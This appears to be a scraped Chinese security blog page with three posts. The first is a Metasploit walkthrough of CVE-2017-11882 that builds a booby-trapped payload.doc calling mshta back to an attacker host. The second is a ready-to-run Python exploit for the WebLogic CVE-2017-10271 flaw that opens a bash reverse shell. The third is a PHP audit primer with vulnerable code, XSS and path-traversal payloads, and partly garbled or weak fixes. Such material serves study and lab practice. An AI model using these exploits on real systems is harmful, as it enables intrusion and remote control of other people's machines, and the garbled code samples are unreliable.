<h3 id="第二步-漏洞利用"><a href="#第二步-漏洞利用" class="headerlink" title="第二步 漏洞利用"></a>第二步 漏洞利用</h3><p>在kali攻击机上启动msf  。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/fa84298f6f.png?imageslim" alt="mark"></p>
<p>查找CVE-2017-11882 漏洞(攻击机已经集成攻击程序)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search CVE-2017-11882</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/CVE-2017-11882</span><br></pre></td></tr></table></figure>
<p>设置payload为反弹tcp </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
<p>查看所需选项</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
<p>设置本机地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lhost 192.168.0.23 [kali操作机地址]</span><br></pre></td></tr></table></figure>
<p>设置uri的路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set URIPATH payload</span><br></pre></td></tr></table></figure></p>
<p>运行payload,启动利用后，msf会监听本机8080端口，靶机访问192.168.0.23:8080/payload.doc，打开doc触发就会得到反弹到4444端口的tcp会话中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/Ce4E70D3l6.png?imageslim" alt="mark"></p>
<p>在/home/college/CVE-2017-11882-payload目录下中执行以下命令：生成 payload.doc </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2017-11882.py -c &quot;mshta http://192.168.0.11[kali操作机地址]:8080 /payload&quot; -o payload.doc</span><br></pre></td></tr></table></figure>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/dFKk1Lf8fJ.png?imageslim" alt="mark"></p>
<p>同样通过ftp上传到桌面上，再点击执行 payload.doc 。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.0.40  [靶机IP地址]</span><br><span class="line">college   college@root</span><br><span class="line">put payload.doc</span><br></pre></td></tr></table></figure>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/KFADlLaIHD.png?imageslim" alt="mark"></p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/J2aAl6El0j.png?imageslim" alt="mark"></p>
<h3 id="第三步-后渗透阶段"><a href="#第三步-后渗透阶段" class="headerlink" title="第三步 后渗透阶段"></a>第三步 后渗透阶段</h3><p>可以看到成功反弹shell，session 1 进入meterpreter终端中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session 1</span><br></pre></td></tr></table></figure>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/9dDGmEj004.png?imageslim" alt="mark"></p>
<p>查看系统信息，如下。进一步可以使用meterpreter进行后渗透攻击。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/7fj8f6GElC.png?imageslim" alt="mark"></p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-weblogin反序列漏洞（CVE-2017-10271)"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/11/05/weblogin反序列漏洞（CVE-2017-10271)/">Weblogic 反序列化漏洞（CVE-2017-10271）</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/11/05/weblogin反序列漏洞（CVE-2017-10271)/" class="article-date">
	  <time datetime="2017-11-05T15:53:56.000Z" itemprop="datePublished">2017-11-05</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Weblogic-反序列化漏洞（CVE-2017-10271）"><a href="#Weblogic-反序列化漏洞（CVE-2017-10271）" class="headerlink" title="Weblogic 反序列化漏洞（CVE-2017-10271）"></a>Weblogic 反序列化漏洞（CVE-2017-10271）</h1><p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://www.exploit-db.com/exploits/43458/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/43458/</a></li>
<li><a href="https://paper.seebug.org/487/" target="_blank" rel="noopener">https://paper.seebug.org/487/</a></li>
<li><a href="https://github.com/Tom4t0/Tom4t0.github.io/blob/master/_posts/2017-12-22-WebLogic%20WLS-WebServices%E7%BB%84%E4%BB%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.md" target="_blank" rel="noopener">https://github.com/Tom4t0/Tom4t0.github.io/blob/master/_posts/2017-12-22-WebLogic%20WLS-WebServices组件反序列化漏洞分析.md</a></li>
<li><a href="http://blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html" target="_blank" rel="noopener">http://blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html</a></li>
</ul>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><img src="http://pn5jn1i1e.bkt.clouddn.com/180402/9agkkF85iF.png?imageslim" alt="mark"></p>
<p>nc 监听 21端口</p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180402/g7lbLkGe4g.png?imageslim" alt="mark"></p>
<p>python3 批量利用脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/xml"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(url)</span>:</span></span><br><span class="line">    data = <span class="string">'''</span></span><br><span class="line"><span class="string">	&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt; &lt;soapenv:Header&gt;</span></span><br><span class="line"><span class="string">	&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;</span></span><br><span class="line"><span class="string">	&lt;java version="1.4.0" class="java.beans.XMLDecoder"&gt;</span></span><br><span class="line"><span class="string">	&lt;void class="java.lang.ProcessBuilder"&gt;</span></span><br><span class="line"><span class="string">	&lt;array class="java.lang.String" length="3"&gt;</span></span><br><span class="line"><span class="string">	&lt;void index="0"&gt;</span></span><br><span class="line"><span class="string">	&lt;string&gt;/bin/bash&lt;/string&gt;</span></span><br><span class="line"><span class="string">	&lt;/void&gt;</span></span><br><span class="line"><span class="string">	&lt;void index="1"&gt;</span></span><br><span class="line"><span class="string">	&lt;string&gt;-c&lt;/string&gt;</span></span><br><span class="line"><span class="string">	&lt;/void&gt;</span></span><br><span class="line"><span class="string">	&lt;void index="2"&gt;</span></span><br><span class="line"><span class="string">	&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.102/21 0&amp;gt;&amp;amp;1&lt;/string&gt;</span></span><br><span class="line"><span class="string">	&lt;/void&gt;</span></span><br><span class="line"><span class="string">	&lt;/array&gt;</span></span><br><span class="line"><span class="string">	&lt;void method="start"/&gt;&lt;/void&gt;</span></span><br><span class="line"><span class="string">	&lt;/java&gt;</span></span><br><span class="line"><span class="string">	&lt;/work:WorkContext&gt;</span></span><br><span class="line"><span class="string">	&lt;/soapenv:Header&gt;</span></span><br><span class="line"><span class="string">	&lt;soapenv:Body/&gt;</span></span><br><span class="line"><span class="string">	&lt;/soapenv:Envelope&gt;</span></span><br><span class="line"><span class="string">	'''</span></span><br><span class="line"></span><br><span class="line">    respond = requests.post(url=url, data=data, headers=headers)</span><br><span class="line">    <span class="keyword">if</span>(respond.status_code == <span class="number">500</span>):</span><br><span class="line">        print(<span class="string">'success'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    url = <span class="string">"http://192.168.1.101:7001/wls-wsat/CoordinatorPortType"</span></span><br><span class="line">    exp(url)</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-PHP 代码审计_知识点"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/10/20/PHP 代码审计_知识点/">PHP 代码审计_知识点</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/10/20/PHP 代码审计_知识点/" class="article-date">
	  <time datetime="2017-10-20T15:53:56.000Z" itemprop="datePublished">2017-10-20</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="PHP-代码审计-知识点"><a href="#PHP-代码审计-知识点" class="headerlink" title="PHP 代码审计_知识点"></a>PHP 代码审计_知识点</h1><h2 id="1-XSS"><a href="#1-XSS" class="headerlink" title="1.XSS"></a>1.XSS</h2><h3 id="1-1反射型XSS"><a href="#1-1反射型XSS" class="headerlink" title="1.1反射型XSS"></a>1.1反射型XSS</h3><h4 id="0x01漏洞背景"><a href="#0x01漏洞背景" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计 算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。<br>非持久型跨站：反射型跨站脚本漏洞，最普遍的类型。</p>
<h4 id="0x02漏洞代码及分析"><a href="#0x02漏洞代码及分析" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><ul>
<li>漏洞代码：</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">username = _GET[<span class="string">'user'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"用户名："</span>.$username;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>将用户输入的user内容直接输出到页面，未经过任何过滤。可导致XSS漏洞攻击</p>
<ul>
<li>payload</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=&lt;script&gt;alart(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h5 id="修复建议："><a href="#修复建议：" class="headerlink" title="-  修复建议："></a>-  修复建议：</h5><p>在接收输入后进行htmlspecialchars过滤，或者在输出前htmlspecialchars过滤</p>
<p>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">username = _GET[<span class="string">'user'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"用户名："</span>.htmlspecialchars($username);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="1-2存储型XSS"><a href="#1-2存储型XSS" class="headerlink" title="1.2存储型XSS"></a>1.2存储型XSS</h3><h4 id="0x01漏洞背景-1"><a href="#0x01漏洞背景-1" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计 算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。<br>存储型跨站：危害大、恶意代码存储服务器(数据库)</p>
<h4 id="0x02漏洞代码及分析-1"><a href="#0x02漏洞代码及分析-1" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><ul>
<li>漏洞代码：        </li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST[<span class="string">'content'</span>])) &#123;</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($mysqli - &gt;query(<span class="string">"insert into test (content)values('$content')"</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'发言成功'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'发言失败'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$data = $mysqli - &gt;query(<span class="string">"select content from test"</span>);</span><br><span class="line"><span class="keyword">if</span> ($data - &gt;num_rows !== <span class="string">'0'</span>) &#123;</span><br><span class="line">    $arr = $data - &gt;fetch_all();</span><br><span class="line">    <span class="keyword">foreach</span>($arr <span class="keyword">as</span> $a) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'发言：'</span>.$a[<span class="number">0</span>].<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用户发言的内容未进行字符串编码，直接存储到数据库中，并取出数据库中带有恶意代码的内容输出到网页中，导致XSS攻击</p>
<ul>
<li>修复建议：</li>
</ul>
<p>在接收输入后进行htmlspecialchars过滤，或者在输出前htmlspecialchars过滤</p>
<p>建议修复代码：<br>echo ‘发言：’.htmlspecialchars($a[0]).’<br>‘;</p>
<h3 id="1-3-DOM-XSS"><a href="#1-3-DOM-XSS" class="headerlink" title="1.3 DOM XSS"></a>1.3 DOM XSS</h3><h4 id="0x01漏洞背景-2"><a href="#0x01漏洞背景-2" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计 算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。<br>DOMXSS：一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。</p>
<h4 id="0x02漏洞代码及分析-2"><a href="#0x02漏洞代码及分析-2" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">img = <span class="keyword">isset</span>(GET[<span class="string">'img'</span>]) ? htmlspecialchars($GET[<span class="string">'img'</span>]) : <span class="string">'default.jpg'</span>;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br><span class="line"></span><br><span class="line">&lt;img src = <span class="string">""</span>id = <span class="string">"image"</span> &gt;</span><br><span class="line"></span><br><span class="line">&lt;script &gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> test = document.getElementById(<span class="string">'image'</span>);</span><br><span class="line"></span><br><span class="line">test.src = <span class="string">'&lt;?php echo $img;?&gt;'</span>;</span><br><span class="line"></span><br><span class="line">&lt; /script&gt;/</span><br></pre></td></tr></table></figure>
<p>使用了htmlspecialchars进行过滤，但单引号没有过滤，导致DOMXSS<br>修复建议：<br>在接收输入后进行htmlspecialchars过滤，并且还有对单引号和反斜杠进行转义<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img = <span class="keyword">isset</span>(GET[<span class="string">'img'</span>]) ? htmlspecialchars(addslashes($GET[<span class="string">'img'</span>])) : <span class="string">'default.jpg'</span>;</span><br></pre></td></tr></table></figure>
<p>漏洞代码2:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">content = <span class="keyword">isset</span>(GET[<span class="string">'content'</span>]) ? htmlspecialchars($GET[<span class="string">'content'</span>]) : <span class="string">'无内容'</span>;</span><br><span class="line"></span><br><span class="line">content = str_replace(<span class="string">"'"</span>, <span class="string">"\'"</span>, content);</span><br><span class="line"></span><br><span class="line">? &gt;</span><br><span class="line"></span><br><span class="line">&lt;div id = <span class="string">"content"</span> &gt;</span><br></pre></td></tr></table></figure>
<p>这是测试内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt; /div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> test = document.getElementById(<span class="string">'content'</span>);</span><br><span class="line"></span><br><span class="line">test.innerHTML = <span class="string">'&lt;?php echo $content;?&gt;'</span>;</span><br><span class="line"></span><br><span class="line">&lt;/script &gt;</span><br></pre></td></tr></table></figure>
<p>innerHTML、documen.write这种直接修改html内容的方法，应对其内容进行严格过滤，否则通过8进制或16进制编码可绕过htmlspecialchars过滤<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = <span class="keyword">isset</span>($_GET[<span class="string">'content'</span>]) ? htmlspecialchars(addslashes($_GET[<span class="string">'content'</span>])) : <span class="string">'无内容'</span>;</span><br></pre></td></tr></table></figure>
<h2 id="1-文件漏洞"><a href="#1-文件漏洞" class="headerlink" title="1.文件漏洞"></a>1.文件漏洞</h2><h3 id="2-1文件读取漏洞"><a href="#2-1文件读取漏洞" class="headerlink" title="2.1文件读取漏洞"></a>2.1文件读取漏洞</h3><h4 id="0x01漏洞背景-3"><a href="#0x01漏洞背景-3" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>任意文件读取漏洞，是web安全里高危的漏洞，它可以泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。</p>
<h4 id="0x02漏洞代码及分析-3"><a href="#0x02漏洞代码及分析-3" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line">template = <span class="keyword">isset</span>(GET[<span class="string">'template'</span>]) ? $GET[<span class="string">'template'</span>] : <span class="string">'index.html'</span>;</span><br><span class="line">file = file_get_contents(<span class="string">'2.1/'</span>.template);</span><br><span class="line"><span class="keyword">echo</span> $file;</span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>未对../进行过滤，导致可以跨目录读取文件。未对后缀名进行限制，导致可以读取php文件内容。<br>修复建议：</p>
<ul>
<li><p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?template=../../../../etc/passwd</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>不允许..等跨目录字符出现，使用addslashes防止%00截断，且限制后缀白名单<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">template = <span class="keyword">isset</span>(GET[<span class="string">'template'</span>]) ? addslashes($GET[<span class="string">'template'</span>]) : <span class="string">'index.html'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strstr(template, <span class="string">'..'</span>) || substr(template, <span class="number">-5</span>, <span class="number">5</span>) != <span class="string">'.html'</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'输入不合法'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>漏洞代码2：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">    action = <span class="keyword">isset</span>(GET[<span class="string">'action'</span>]) ? $GET[<span class="string">'action'</span>] : <span class="string">'login'</span>;</span><br><span class="line"></span><br><span class="line">    fp = <span class="string">"./2.1/"</span>.action.<span class="string">"/index.html"</span>;</span><br><span class="line"></span><br><span class="line">    f = fopen(fp, <span class="string">'r'</span>);</span><br><span class="line"></span><br><span class="line">    strout = fread(f, filesize($fp));</span><br><span class="line"></span><br><span class="line">    fclose($f);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $strout;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>未对../进行过滤，导致可以跨目录读取文件。未过滤%00字节，在&lt;PHP5.3.4版本中，可在截断后自定义路径和文件名</p>
<ul>
<li><p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=../../../etc/passwd%00</span><br></pre></td></tr></table></figure>
</li>
<li><p>修复建议：</p>
</li>
</ul>
<p>不允许..等跨目录字符出现，使用addslashes防止%00截断<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">action = <span class="keyword">isset</span>(GET[<span class="string">'action'</span>]) ? addslashes($GET[<span class="string">'action'</span>]) : <span class="string">'login'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strstr($template, <span class="string">'..'</span>))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'输入不合法'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-2文件上传漏洞"><a href="#2-2文件上传漏洞" class="headerlink" title="2.2文件上传漏洞"></a>2.2文件上传漏洞</h3><h4 id="0x01漏洞背景-4"><a href="#0x01漏洞背景-4" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>上传文件的时候，如果服务器端脚本语言，未对上传的文件进行严格的验证和过滤，就有可能上传恶意的脚本文件，从而控制整个网站，甚至是服务器。<br>0x02漏洞代码及分析<br>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span> || FILES <span class="string">"file"</span> == <span class="string">"image/jpeg"</span> || $FILES <span class="string">"file"</span> == <span class="string">"image/pjpeg"</span>) &amp;&amp; $_FILES</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($_FILES <span class="string">"file"</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Return Code: "</span>.$_FILES <span class="string">"file"</span>.<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Upload: "</span>.$_FILES <span class="string">"file"</span>.<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Type: "</span>.$_FILES <span class="string">"file"</span>.<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Size: "</span>.$_FILES <span class="string">"file"</span> / <span class="number">1024.</span><span class="string">" Kb&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Temp file: "</span>.$_FILES <span class="string">"file"</span>.<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="string">"2.2/upload/"</span>.$_FILES <span class="string">"file"</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> $_FILES <span class="string">"file"</span>.<span class="string">" already exists. "</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            move_uploaded_file(_FILES[<span 